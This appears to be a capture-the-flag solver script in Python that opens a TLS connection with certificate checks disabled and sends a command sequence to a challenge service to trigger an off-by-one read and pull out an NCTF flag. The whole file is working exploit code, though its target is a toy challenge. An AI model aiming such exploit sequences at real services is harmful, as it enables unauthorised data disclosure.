#!/usr/bin/env python3
# FZLP/1 off-by-one, mode strict req->resp + diagnostic. python3 iofuzz.py <host> <port> [ch3]
import sys, ssl, socket, time, re
HOST=sys.argv[1]; PORT=int(sys.argv[2]) if len(sys.argv)>2 else 1337
CH3=sys.argv[3] if len(sys.argv)>3 else "07"

ctx=ssl._create_unverified_context()
s=ctx.wrap_socket(socket.create_connection((HOST,PORT),timeout=15))
s.settimeout(1.5)

def recv():
    out=b""
    try:
        while True:
            d=s.recv(4096)
            if not d: break
            out+=d
    except socket.timeout:
        pass
    return out.decode("utf-8","replace")

def send(line):
    try:
        s.sendall(line.encode()+b"\n")
    except Exception as e:
        print(f"  [send FAIL '{line}': {e}]"); return False
    return True

print("[banner]", recv().strip())
# sequence : la ligne de commande CFG, puis 4 entrees (off-by-one lit n+1), puis DUMP
seq = ["PING","STAT","CFG 3","00","00","00",CH3,"STAT","DUMP"]
allout=""
for line in seq:
    if not send(line): break
    r=recv()
    allout+=r
    print(f"> {line}\n< {r.strip()}")
    time.sleep(0.1)
m=re.search(r"NCTF\{[^}]*\}",allout)
if m: print("\n[+] FLAG:",m.group())
s.close()
